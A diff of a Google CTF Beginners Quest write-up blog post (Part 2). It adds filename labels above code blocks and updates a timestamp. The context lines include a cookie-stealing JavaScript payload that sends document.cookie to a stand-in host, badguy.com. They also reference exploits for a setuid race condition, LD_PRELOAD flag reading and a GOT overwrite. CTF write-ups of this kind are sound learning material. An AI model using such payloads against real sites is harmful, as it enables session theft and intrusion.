@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-07-31 18:49:05 +0000
-last_modified_at: 2018-08-03 17:43:14 +0000
+last_modified_at: 2018-08-03 19:18:37 +0000
 title: "Google CTF: Beginners Quest (Part 2)"
 category: CTF
 tags: [Google]
@@ -124,6 +124,7 @@ The page at `https://router-ui.web.ctfcompetition.com` responds with the wrong c
 
 The file `bad.js` can be simple as this to steal the session cookies registered with `router-ui.web.ctfcompetition.com`.
 
+<div class="filename"><span>bad.js</span></div>
 ```js
 document.location = 'http://www.badguy.com/flag.png?' + document.cookie;
 ```
@@ -132,6 +133,7 @@ Next up, we've to figure out the link to send to Wintermuted such that clicking 
 
 This is how it looks like.
 
+<div class="filename"><span>index.html</span></div>
 ```html
 <html>
   <body>
@@ -432,6 +434,7 @@ Right off the bat, I notice the following:
 
 The size is telling—this is perhaps a feeble attempt to throw off any analysis in reverse engineering the executable. Despite its size, the behavior of the executable is somewhat simple after some reverse engineering.
 
+<div class="filename"><span>poetry.c</span></div>
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -462,6 +465,7 @@ Like the code of `pulseaudio` in the post, `poetry` is re-executing itself throu
 
 Essentially, this challenge is about exploiting a race condition such that when we are reading the symbolic link `/proc/self/exe` through `readlink`; we create a hardlink and thereby control the path to a executable that we want to run; and have `execv` execute that instead. And because `poetry` is `setuid` to `poetry`, we want to run a executable that reads the flag at /`home/poetry/flag`. Let's call it `recite.c` since we are reciting poetry after all.
 
+<div class="filename"><span>recite.c</span></div>
 ```c
 #include <stdio.h>
 
@@ -594,6 +598,7 @@ This should work because `execvp` takes the extern variable `environ` as the env
 
 The shared object loaded in `LD_PRELOAD` should help us read the flag. This simple code `readflag.c` does that.
 
+<div class="filename"><span>readflag.c</span></div>
 ```c
 #include <stdio.h>
 
@@ -710,6 +715,7 @@ We can use `-4` as the index to write to the memory at `0x555555559088`, the GOT
 
 Now that we've set the stage, let's proceed with the exploitation. To that end, I wrote this simple Python script, `exploit.py`. The script contains a telnet client at the end to interact with the program.
 
+<div class="filename"><span>exploit.py</span></div>
 ```python
 from socket import *
 from struct import *
@@ -785,6 +791,7 @@ There's no source code in this challenge. I've no choice but to put my reverse e
 
 This is my result of reversing engineering the executable back to source code. I'm confident this is close to the original source code. The compiled executable is almost identical to `holey_beep` line for line after disassembly.
 
+<div class="filename"><span>holey_beep.c</span></div>
 ```c
 #include <err.h>
 #include <fcntl.h>
@@ -843,6 +850,7 @@ We could create a symbolic link between `/secret_cake_recipe` and `dev/console`.
 
 Now, how do we send a `SIGTERM` while the program is running? To that end, I wrote `woot.c` to automate this.
 
+<div class="filename"><span>woot.c</span></div>
 ```c
 #include <signal.h>
 #include <stdio.h>
